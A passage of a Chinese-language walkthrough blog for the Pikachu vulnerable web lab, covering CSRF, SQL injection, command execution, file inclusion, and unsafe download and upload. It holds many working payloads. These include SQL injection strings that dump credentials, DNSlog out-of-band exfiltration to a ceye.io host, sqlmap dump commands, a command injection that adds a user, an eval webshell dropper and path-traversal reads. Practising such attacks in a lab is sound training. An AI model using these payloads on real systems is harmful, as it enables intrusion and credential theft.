链接\n\n1、allen用户登录，查看个人信息\n\n![](https://img.jwt1399.top//img/20200807201741.png)\n\n2、allen用户点击上面我们构造的Payload\n\n3、再次查看信息，发现allen的性别、手机、住址、邮箱，已经修改为我上面 Payload 中定义的数据了，成功实现 CSRF 攻击\n\n![](https://img.jwt1399.top//img/20200807201741.png)\n\n### CSRF(post)\n\n抓包发现，请求通过POST方式提交，从而无法像前面一样通过伪造URL来进行攻击\n\n详细利用过程请参考：[Pikachu漏洞靶场系列之CSRF](https://www.naraku.cn/posts/25.html)\n\nCSRFTester下载地址：https://wiki.owasp.org/images/0/08/CSRFTester-1.0.zip\n\n### CSRF Token\n\n原理：CSRF的主要问题是敏感操作的链接容易被伪造。而只要在每次请求时都增加一个随机码`Token`，后台每次都对这个随机码进行验证，则可以有效地防止CSRF\n\n在源码`token_get_edit.php`中看到，每次刷新页面，都会调用`set_token()`函数，该函数会把`SESSION`中`Token`销毁，然后生成一个新的`Token`，并将这个`Token`传到前端表单中\n\n```html\n<div id=\"per_info\">\n   <form method=\"get\">\n   <h1 class=\"per_title\">hello,{$name},欢迎来到个人会员中心 | <a style=\"color:bule;\" href=\"token_get.php?logout=1\">退出登录</a></h1>\n   <p class=\"per_name\">姓名:{$name}</p>\n   <p class=\"per_sex\">性别:<input type=\"text\" name=\"sex\" value=\"{$sex}\"/></p>\n   <p class=\"per_phone\">手机:<input class=\"phonenum\" type=\"text\" name=\"phonenum\" value=\"{$phonenum}\"/></p>    \n   <p class=\"per_add\">住址:<input class=\"add\" type=\"text\" name=\"add\" value=\"{$add}\"/></p> \n   <p class=\"per_email\">邮箱:<input class=\"email\" type=\"text\" name=\"email\" value=\"{$email}\"/></p>\n       \n   <input type=\"hidden\" name=\"token\" value=\"{$_SESSION['token']}\" />\n       \n   <input class=\"sub\" type=\"submit\" name=\"submit\" value=\"submit\"/>\n   </form>\n</div>\n```\n\n当每次提交表单时，这个`Token`值就会传到后台与`SESSION`中的`Token`进行比较，若不相等，此次表单则提交失败。所以黑客由于不能得知用户当前的`Token`值，从而无法进行CSRF攻击。\n\n### CSRF防范\n\n- 对敏感信息的操作增加安全的token；\n- 对敏感信息的操作增加安全的验证码；\n- 对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。\n\n## **SQL-Inject**\n\n> **SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。**\n\n**这里我就不讲原理了，需要了解SQL注入原理的，请看我另一篇文章：[深入剖析SQL注入](https://jwt1399.top/posts/32179.html)**\n\n### **数字型注入(post)**\n\n**直接 BurpSuite 抓包，发到 Repeater 中，修改 id 参数的值，查看响应结果。**\n\n```sql\n#查看页面变化，判断sql注入类别 \nid=1\nid=1'\n\n#确定字段数 \nid=1 order by 2 \nid=1 order by 3 \n\n#联合查询查看显示位 \nid=-1 union select 1,2 \n\n#爆库【pikachu】\nid=-1 union select 1,group_concat(schema_name) from information_schema.schemata \n或者\nid=-1 union select 1,database() \n\n#爆表【httpinfo,member,message,users,xssblind】\nid=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() \n\n#爆列【...user,password,...】 \nid=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' \n\n#爆值 \nid=-1 union select 1,concat_ws('-',username,password) from users\n```\n\n**![](https://img.jwt1399.top//img/20200726142002.png)**\n\n### **字符型注入(get)**\n\n```sql\n#查看页面变化，判断sql注入类别 \n1\n1'\n\n#确定字段数【2】  \n1' order by 3 # \n1' order by 4 # \n\n#联合查询查看显示位\n-1' union select 1,2 # \n\n#爆库【pikachu】 \n-1' union select 1,group_concat(schema_name) from information_schema.schemata #\n或者\n-1' union select 1,database() # \n\n#爆表【httpinfo,member,message,users,xssblind】 \n-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #\n\n#爆列【...,username,password,...】 \n-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #\n\n#爆值\n-1' union select 1,concat_ws('-',username,password) from users #\n```\n\n**![](https://img.jwt1399.top//img/20200726142232.png)**\n\n### **搜索型注入**\n\n**搜索型查询使用的 SQL 语句格式：**\n\n```sql\nselect username from user where username like '%{$username}%';\n```\n\n**此时可将`{$username}`部分构造成 payload：`x%' union select 1,2 from users #`**\n\n**此时执行的 SQL 语句为：**\n\n```sql\nselect username from user where username like '%x%' union select 1,2 from users #%';\n```\n\n**搜索型注入使用上面的字符型注入方法也可实现注入，这里我就使用新的绕过 payload**\n\n```sql\n#查看页面变化，判断sql注入类别 \n1\n1'\n\n#确定字段数【3】  \nx%' order by 3 # \nx%' order by 4 # \n\n#联合查询查看显示位\nx%' union select 1,2,3 # \n\n#爆库【pikachu】 \nx%' union select 1,2,group_concat(schema_name) from information_schema.schemata #\n或者\nx%' union select 1,2,database() # \n\n#爆表【httpinfo,member,message,users,xssblind】 \nx%' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #\n\n#爆列【...,username,password,...】 \nx%' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' #\n\n#爆值\nx%' union select 1,2,concat_ws('-',username,password) from users #\n```\n\n### **xx型注入**\n\n```sql\n#查看页面变化，判断sql注入类别 \n1\n1'     #  for the right syntax to use near ''1'')' at line 1\n\n猜测SQL语句为select username from user where username=('$name');\n\n\n#确定字段数【2】  \nx') order by 2 # \nx') order by 3 # \n\n#联合查询查看显示位\nx') union select 1,2 # \n\n#爆库【pikachu】 \nx') union select 1,group_concat(schema_name) from information_schema.schemata #\n或者\nx') union select 1,database() # \n\n#爆表【httpinfo,member,message,users,xssblind】 \nx') union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #\n\n#爆列【...,username,password,...】 \nx') union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #\n\n#爆值\nx') union select 1,concat_ws('-',username,password) from users #\n```\n\n### **“insert/update”注入**\n\n> **insert /update注入是指我们前端注册的信息，后台会通过 insert/update 这个操作插入/更新到数据库中。如果后台没对我们的输入做防 SQL 注入处理，我们就能在注册时通过拼接 SQL 注入。**\n\n#### **insert注入**\n\n**进入注册页面，填写必填的两项，用户那里输入单引号，密码输入123，页面会有报错信息(` for the right syntax to use near '123'),'','','','')' at line 1`)，说明存在SQL注入漏洞**\n\n**猜测sql语句为：**\n\n```sql\n$query=\"insert into member(username,pw,sex,phonenum,email,address) values('$username','$password','$sex','$phonenum','$email','add')\";\n```\n**)构造Payload：此处最后多加一个`)`闭合`value()`的`(`，用注释符`#`解决`value()`的`)`**\n\n**1、爆库**\n\n**updatexml()函数：**\n\n```sql\n1' and updatexml(1,concat('~',database()),1)) #\n```\n\n**extractvalue()函数：**\n\n```sql\n1' and extractvalue(1,concat('~',database()))) #\n```\n\n**floor()函数：**\n\n```sql\n1' and (select 1 from (select count(*),concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a))#\n```\n\n**2、爆表**\n\n**updatexml()函数：**\n\n```sql\n1' and updatexml(1,concat('~',(select table_name from information_schema.tables where table_schema = database() limit 0,1)),1))#\n```\n\n**extractvalue()函数：**\n\n```sql\n1' and extractvalue(1,concat('~',(select table_name from information_schema.tables where table_schema = database() limit 0,1))))#\n```\n\n**floor()函数：**\n\n```sql\n1'and (select 1 from (select count(*),concat('~',(select table_name from information_schema.tables where table_schema = database() limit 0,1),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a))#\n```\n\n**3、爆字段**\n\n**updatexml()函数：**\n\n```sql\n1' and updatexml(1,concat('~',(select column_name from information_schema.columns where table_name = 'users' limit 0,1)),1))#\n```\n\n**extractvalue()函数：**\n\n```sql\n1' and extractvalue(1,concat('~',(select column_name from information_schema.columns where table_name = 'users' limit 0,1))))#\n```\n\n**floor()函数：**\n\n```sql\n1'and (select 1 from (select count(*),concat('~',(select column_name from information_schema.columns where table_name = 'users' limit 0,1),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a))#\n```\n\n**4、爆值**\n\n**updatexml()函数：**\n\n```sql\n查username：1' and updatexml(1,concat('~',(select username from users limit 0,1)),1))#\n\n查password：1' and updatexml(1,concat(0,(select password from users where username='admin')),1))#\n\nupdatexml()、extractvalue()有长度限制，将之前想用来标记位置的’~'换成0，返回完整的32位md5值，不改的话每次只能显示31个字符\n```\n\n**extractvalue()函数：**\n\n```sql\n查username：1' and extractvalue(1,concat('~',(select username from users limit 0,1))))#\n查password：1' and extractvalue(1,concat(0,(select password from users where username='admin'))))#\n```\n\n**floor()函数：**\n\n```sql\n1'and (select 1 from (select count(*),concat('~',(select concat(username,'~',password) from users limit 0,1),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a))#\n```\n\n#### **update注入**\n\n**注册账号后登录，可以修改个人信息，进入修改页面，填写四项项，性别那里输入单引号，密码输入123，页面会有报错信息(`  for the right syntax to use near '1',address='1',email='1'' where username='jwt'' at line 1`)，说明存在SQL注入漏洞**\n\n**猜测sql语句为：**\n\n```sql\n$query=\"update member set sex='$sex',phonenum='$phonenum',address='$add',email='$email' where username='xxx'\";\n```\n\n**构造Payload：与insert注入相似，只是闭合不同，最后少加一个`）`**\n\n**爆库**\n\n**updatexml()函数：**\n\n```sql\n1' and updatexml(1,concat('~',database()),1) #\n```\n\n**extractvalue()函数：**\n\n```sql\n1' and extractvalue(1,concat('~',database())) #\n```\n\n**floor()函数：**\n\n```sql\n1' and (select 1 from (select count(*),concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a)#\n```\n\n**获取其他数据库信息参照上面 insert 注入，只是闭合不同，最后少加一个`）`,这里小简我就不再赘述了。**\n\n**参考：**\n\n**[利用insert、update和delete注入获得数据](https://www.cnblogs.com/babers/articles/7252401.html)**\n\n**[SQL注入之insert/update/delete注入](https://blog.csdn.net/weixin_44426869/article/details/104326877)**\n\n**[SQL注入实战之报错注入篇（updatexml extractvalue floor）](https://www.cnblogs.com/c1047509362/p/12806297.html)**\n\n**[web实验三——pikachu之sql注入](http://www.mamicode.com/info-detail-2864192.html)**\n\n### **“delete”注入**\n\n**这里有一个留言板，点删除可以把对应的留言删掉，点删除时用 BurpSuite 抓包，实际上就是传递了一个留言的 id，后台根据这个 id 去删除留言**\n\n**![](https://img.jwt1399.top//img/20200727164128.png)**\n\n**猜测sql语句为：**\n\n```sql\n$query=\"delete from message where id=x\";\n```\n\n**发送到 `Repeater` 模块中继续进行测试，发现可能存在数字型注入漏洞，**\n\n**构造Payload：修改id值时，需要做URL转码，再放包**\n\n**爆库**\n\n**updatexml()函数：**\n\n```sql\n1 and updatexml(1,concat('~',database()),1)\n```\n\n**extractvalue()函数：**\n\n```sql\n1 and extractvalue(1,concat('~',database()))\n```\n\n**floor()函数：**\n\n```sql\n1 and (select 1 from (select count(*),concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a)\n```\n\n**![](https://img.jwt1399.top//img/20200727165448.png)**\n\n**获取其他数据库信息参照上面 insert 注入，只是闭合方式不同，这里小简我就不再赘述了。**\n\n### **\"http header\"注入**\n\n**查看提示得到登录账号【admin / 123456】，登陆之后会记录以下信息**\n\n```\n你的ip地址:192.168.137.1\n\n你的user agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 Edg/84.0.522.44\n\n你的http accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n\n你的端口（本次连接）:tcp11004\n```\n\n**通过这些信息我们可以猜测，这个后端应该对`HTTP header`里面的数据进行了获取，应该也进行了相关数据库的操作，Burpsuite抓包进行测试，测试发现User-Agent、Accept、Cookie处存在SQL注入**\n\n**User-Agent注入**\n\n**修改User-Agent实现注入，这里我用注释符一直报错，所以用`and '`进行闭合**\n\n```sql\n1' and updatexml(1, concat(0x7e, database()), 1) and '\n```\n\n**![](https://img.jwt1399.top//img/20200727172454.png)**\n\n**Accept注入**\n\n**修改Accept实现注入**\n\n```sql\n1' and updatexml(1, concat(0x7e, database()), 1) #\n```\n\n**![](https://img.jwt1399.top//img/20200727173340.png)**\n\n**Cookie注入**\n\n**修改Cookie实现注入**\n\n```sql\nadmin' and updatexml(1, concat(0x7e, database()), 1) #\n```\n\n**![](https://img.jwt1399.top//img/20200727172742.png)**\n\n**这里只演示了获取数据库，想要获取其他数据库信息方法一样，只需要修改注入语句即可**\n\n### **盲注(base on bollian)**\n\n **布尔注入利用情景**\n\n- **页面上没有显示位，并且没有输出SQL语句执行错误信息**\n- **只能通过页面返回正常与不正常判断**\n\n**这里是字符型盲注，我就不讲盲注原理和手工盲注了，需要了解的，请看我另一篇文章：[深入剖析SQL注入](https://jwt1399.top/posts/32179.html)**\n\n#### **SqlMap实现布尔盲注**\n\n```sql\n--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。\n--threads 10 :设置线程为10，运行速度会更快\n```\n\n```sql\n#查询数据库【pikachu】 \npython sqlmap.py -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2\"  --dbs\n\n#获取数据库中的表【httpinfo,member,message,users,xssblind】 \npython sqlmap.py -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2\" -D pikachu --tables --batch --threads 10 \n\n#获取表中的字段名【...user,password,...】 \npython sqlmap.py -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2\"  -D pikachu -T users --columns --batch --threads 10 \n\n#获取字段信息\npython sqlmap.py -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2\" -D pikachu -T users -C username,password --dump --batch --threads 10\n```\n\n**![](https://img.jwt1399.top//img/20200727215251.png)**\n\n#### **DNSlog外带数据注入**\n\n##### **查询数据库**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select database()),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n\n1' and if((select load_file(concat('\\\\\\\\',(select database()),'.8tiwyi.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200807095247.png)\n\n##### **查询表**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema=database() limit 3,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200807095519.png)\n\n##### **查询列**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select column_name from information_schema.columns where table_name='users' limit 4,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200807095617.png)\n\n##### **查询值**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select concat_ws('--',username,password) from users limit 0,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200807102111.png)\n\n### **盲注(base on time)**\n\n**时间注入利用情景**\n\n- **页面上没有显示位**\n- **没有输出报错语句**\n- **正确的sql语句和错误的sql语句页面返回一致**\n\n#### **SqlMap实现时间盲注**\n\n```\n--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。\n--technique:选择注入技术，-T:Time-based blind  （基于时间延迟注入）\n--threads 10 :设置线程为10，运行速度会更快。\n```\n\n```bash\n#查询数据库 #【pikachu】\npython sqlmap.py -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=1&submit=%E6%9F%A5%E8%AF%A2#\" --technique T --current-db --batch --threads 10\n\n#获取数据库中的表 #【httpinfo,member,message,users,xssblind】\npython sqlmap.py  -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=1&submit=%E6%9F%A5%E8%AF%A2#\" --technique T -D pikachu  --tables --batch --threads 10\n\n#获取表中的字段名 #【...user,password,...】\npython sqlmap.py -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=1&submit=%E6%9F%A5%E8%AF%A2#\" --technique T -D pikachu -T users --columns --batch --threads 10 \n\n#获取字段信息\npython sqlmap.py -u \"http://192.168.137.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=1&submit=%E6%9F%A5%E8%AF%A2#\" --technique T -D pikachu -T users -C username,password --dump --batch --threads 10 \n```\n#### **DNSlog外带数据注入**\n\n##### **查询数据库**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select database()),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n##### **查询表**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema=database() limit 3,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n##### **查询列**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select column_name from information_schema.columns where table_name='users' limit 4,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n##### **查询值**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select concat_ws('--',username,password) from users limit 0,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n### **宽字节注入**\n\n**这里我就不讲原理了，需要了解宽字节注入原理的，请看我另一篇文章：[深入剖析SQL注入](https://jwt1399.top/posts/32179.html)**\n\n**通过测试，发现这是post传参，所以BurpSuite抓包进行测试。**\n\n```sql\n#确定字段数\n1%df' order by 1 --+  \n这里用order by判断字段数量会报错,暂时不知道什么原因。\n\n#确定显示位\n-1%df' union select 1,2 --+\n\n#查询数据库 \n-1%df' union select 1,database() --+ \n\n#查询表名 \n-1%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+ \n\n#查询字段名 \n-1%df' union select 1, group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+ \n\n这里表名table_name的值必须转换成16进制，如果不用16进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用16进制避免了这个问题。 \n\n#查询字段信息 \n-1%df' union select 1,group_concat(username,0x3a,password) from users --+ \n```\n\n**![](https://img.jwt1399.top//img/20200727182636.png)**\n\n\n\n### **SQL注入防范**\n\n**1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；**\n**2.使用参数化（Parameterized Query 或 Parameterized Statement）；**\n**3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了\"拼接\"的方式,所以使用时需要慎重!**\n\n## **RCE**\n\n### **基础知识准备**\n\n> **RCE(Remote Command/Code Execute)，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。**\n\n#### **命令拼接符**\n\n##### **windows**\n\n1. **`“|”` 管道符，前面命令标准输出，后面命令的标准输入**\n2. **`“&”` commandA & commandB 先运行命令A然后运行命令B**\n3. **`“||”` commandA || commandB 运行命令A，如果失败则运行命令B**\n4. **`“&&”` commandA && commandB 运行命令A，如果成功则运行命令B**\n\n##### **linux**\n\n1. **`“|”` 管道符，前面命令标准输出，后面命令的标准输入**\n2. **`“&”` commandA & commandB 先运行命令A然后运行命令B**\n3. **`“||”` commandA || commandB 运行命令A，如果失败则运行命令B**\n4. **`“&&”` commandA && commandB 运行命令A，如果成功则运行命令B**\n5. **`“;”` commandA;commandB执行完A执行B**\n6. **`“%0a”` 换行符**\n7. **`“%0d”` 回车符**\n\n#### **命令执行函数**\n\n**在PHP中，可以执行命令的函数有：**\n\n**`system、exec、shell_exec、passthru、pcntl_exec、popen、proc_popen等`**\n\n### **exec \"ping\"**\n\n**源码分析：**\n\n```php\nif(isset($_POST['submit']) && $_POST['ipaddress']!=null){\n    $ip=$_POST['ipaddress'];\n    if(stristr(php_uname('s'), 'windows')){\n        $result.=shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理\n    }else {\n        $result.=shell_exec('ping -c 4 '.$ip);\n    }\n}\n```\n\n**可以看到执行`shell_exec()`函数时是直接拼接的`$ip`变量，那我们可以直接拼接恶意命令进行执行。**\n\n**因为是Windows环境，所以只能执行Windows下的命令**\n\n**Payload:**\n\n```\n127.0.0.1 | dir\n127.0.0.1 & dir\n127.0.0.1 || dir\n127.0.0.1 && dir\n127.0.0.1 & ipconfig\n127.0.0.1 | net user hack 123 /add #添加用户\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/zOi6W3aQoCvgPj5.png)**\n\n### **exec \"eval\"**\n\n**源码分析：**\n\n```php\nif(isset($_POST['submit']) && $_POST['txt'] != null){\n    if(@!eval($_POST['txt'])){\n        $html.=\"<p>你喜欢的字符还挺奇怪的!</p>\";\n```\n\n**提交内容进入了 `@!eval`中 如果不报错就执行,报错就会输出一句话**\n\n**Payload:**\n\n```\nphpinfo();\nsystem(\"dir\");\nsystem(\"ipconfig\");\nsystem(\"whoami\");\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/FeypcaCuTHD47os.png)**\n\n## **File Inclusion**\n\n### **简介**\n\n> **`File Inclusion`(文件包含漏洞)，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：**\n> **`include(),include_once(),require(),require_once()`,这些文件包含函数在代码设计中被经常使用到。**\n\n\t大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 \n\n### **文件包含函数**\n\n#### **include( )**\n\n**当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含**\n**进来，发生错误时之给出一个警告，继续向下执行。**\n\n#### **include_once( )**\n\n**功能与 Include()相同，区别在于当重复调用同一文件时，程序只调用一次**\n\n#### **require( )**\n\n**require()与 include()的区别在于require()执行如果发生错误，函数会输出**\n**错误信息，并终止脚本的运行。**\n\n#### **require_once( )**\n\n**功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次。**\n\n### **Local**\n\n> **本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。**\n\n**源码分析：**\n\n```php\nif(isset($_GET['submit']) && $_GET['filename']!=null){\n    $filename=$_GET['filename'];\n    include \"include/$filename\";\n}\n```\n\n**`$_GET['filename']`参数开发者没有经过严格的过滤，直接带入了`include`的函数，攻击者可以修改`filename`的值，执行非预期的操作。**\n\n**安全的写法:**\n\n**使用白名单，严格指定包含的文件名**\n\n```php\nif($filename=='file1.php' || $filename=='file2.php' || $filename=='file3.php' || \t\t\t$filename=='file4.php' || $filename=='file5.php'){\n         include \"include/$filename\";\n}\n```\n\n**打开平台，选择一个选项,可以看到上传了一个文件名到后台，后台打开包含的指定目标文件**\n\n```\nhttp://127.0.0.1/pikachu-master/vul/fileinclude/fi_local.php?filename=file1.php&submit=%E6%8F%90%E4%BA%A4\n```\n\n**Linux 或Windows，我们都可以使用 `“../”` 的方式进行目录穿越，读取其他目录下的文件**\n\n**payload**\n\n```\n?filename=../../../../Windows/System32/drivers/etc/hosts       #读取本地域名解析文件\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/aWlPwkITdbYUGJE.png)**\n\n### **Rrmote**\n\n> **远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。**\n\n**`注意：`远程包含漏洞的前提：如果使用的incldue和require，则需要在phpStudy或php.ini中配置开启下面选项**\n\n```ini\nallow_url_fopen=on //默认打开\nallow_url_include=on //默认关闭\n```\n\n**源码分析：**\n\n```php\nif(isset($_GET['submit']) && $_GET['filename']!=null){\n    $filename=$_GET['filename'];\n    include \"$filename\";\n}\n```\n\n**跟上面本地代码一样，变量传进来直接包含,没做任何的安全限制**\n\n**打开平台，选择一个选项。同样是通过传递一个文件名进行包含的**\n\n```\nhttp://127.0.0.1/pikachu-master/vul/fileinclude/fi_remote.php?filename=include%2Ffile1.php&submit=%E6%8F%90%E4%BA%A4\n```\n\n**因为这个限制只能读取txt文件,这里txt会被解析成php执行，所以我们写一个`yijuhua.txt`文件执行过后让他自己生成木马**\n\n```php\n<?php\n$myfile = fopen(\"yijuhua.php\", \"w\");\n$txt = '<?php @eval($_POST['x']);?>';\nfwrite($myfile, $txt);\nfclose($myfile);\n?>\n```\n\n**payload:**\n\n```\n?filename=http://127.0.0.1/pikachu-master/test/yijuhua.txt\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/p5ETxhGDOWcMXeN.png)**\n\n**运行之后果然产生了一句话木马文件**\n\n**用蚁剑进行连接**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/7MJ6t2aYUDkb9Bz.png)**\n\n**连接成功**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2eIfGw4lEKFzMq1.png)**\n\n## **unsafe filedownload**\n\n>**此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。**\n\n**提示说点击球员名字即可下载头像图片**\n\n**点击科比的会直接下载，右键点击，选择复制链接，得到如下链接**\n\n```Payload\nhttp://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=kb.png\n```\n\n**可以看到是直接通过filename进行读取文件的，那我们来尝试下载在上一页面URL中发现的`down_nba.php`**\n\n```Payload\nhttp://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=../down_nba.php\n```\n\n**果然成功下载，当然还可以通过`../../`来构造下载其他文件**\n\n**防范措施：**　　　　　　　　　　　　　　　　　　\n\n**1.对传入的文件名进行严格的过滤和限定**\n\n**2.对文件下载的目录进行严格的限定**\n\n##  **unsafe upfileupload**\n\n> **文件上传功能在web应用系统很常见，当用户点击上传按钮后，后台会对上传的文件进行判断,比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。**\n\n### **client check**\n\n**界面提示`这里只允许上传图片o！`，上传php文件会`弹框`提示`上传的文件不符合要求，请重新选择！`**\n\n**F12检查元素,发现是通过JS进行check的，这样就很容易绕过了**\n\n```html\n<input class=\"uploadfile\" type=\"file\" name=\"uploadfile\" onchange=\"checkFileExt(this.value)\">\n```\n\n**找到check的JS代码，只对后缀名做了校验**\n\n```javascript\nfunction checkFileExt(filename)\n{\n    var flag = false; //状态\n    var arr = [\"jpg\",\"png\",\"gif\"];\n    //取出上传文件的扩展名\n    var index = filename.lastIndexOf(\".\");\n    var ext = filename.substr(index+1);\n    //比较\n    for(var i=0;i<arr.length;i++)\n    {\n        if(ext == arr[i])\n        {\n            flag = true; //一旦找到合适的，立即退出循环\n            break;\n        }\n    }\n    //条件判断\n    if(!flag)\n    {\n        alert(\"上传的文件不符合要求，请重新选择！\");\n        location.reload(true);\n    }\n}\n```\n\n**绕过方法一：**\n\n**修改`JS`，直接将`php`后缀名加上，在控制台运行，然后就可以成功上传php文件了**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200529092420.png)\n\n\n\n**上传一个 info.php 内容如下：**\n\n```php\n<?php phpinfo();?>\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200529092714193.png)**\n\n**获取到上传路径后直接访问看看**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200529092857.png)**\n\n**绕过方法二：**\n\n**将info.php后缀改为png，然后上传，利用BP进行拦截，然后将png改为php重新发包**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200529093908.png)**\n\n\n\n### **MIME check**\n\n> **MIME（Multipurpose Internet Mail Extensions）多用途互连网右键扩展类型。**\n>\n> 